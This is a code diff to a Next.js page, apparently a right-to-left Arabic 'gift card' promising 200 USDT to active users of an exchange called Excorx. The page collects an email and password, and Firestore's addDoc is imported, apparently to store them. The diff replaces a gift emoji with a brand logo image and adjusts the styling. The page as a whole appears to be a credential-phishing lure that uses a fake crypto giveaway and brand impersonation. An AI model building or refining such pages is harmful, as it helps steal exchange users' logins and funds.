@@ -1,8 +1,11 @@
+
 'use client';
 
 import React, { useState } from 'react';
+import Image from 'next/image';
 import { useFirestore } from '@/firebase';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { PlaceHolderImages } from '@/lib/placeholder-images';
 
 export default function Home() {
   const db = useFirestore();
@@ -10,6 +13,8 @@ export default function Home() {
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
   const [submitted, setSubmitted] = useState(false);
+
+  const logo = PlaceHolderImages.find(img => img.id === 'excorex-logo');
 
   const submitRequest = async () => {
     if (!email || !password) {
@@ -67,11 +72,11 @@ export default function Home() {
         }
 
         .gift-icon {
-            font-size: 70px;
-            line-height: 1;
-            margin-bottom: 10px;
+            margin-bottom: 20px;
             filter: drop-shadow(0 0 20px #3b82f6);
             animation: float 3s ease-in-out infinite;
+            display: flex;
+            justify-content: center;
         }
 
         @keyframes float {
@@ -209,7 +214,18 @@ export default function Home() {
       `}</style>
 
       <div className="gift-card" dir="rtl">
-        <div className="gift-icon">🎁💰</div>
+        <div className="gift-icon">
+          {logo && (
+            <Image 
+              src={logo.imageUrl} 
+              alt={logo.description} 
+              width={110} 
+              height={110} 
+              className="rounded-3xl"
+              data-ai-hint={logo.imageHint}
+            />
+          )}
+        </div>
         <h1>عرض خاص: 200 USDT</h1>
         <div className="sub-title">هدية لمستخدمي Excorx النشطين</div>
 
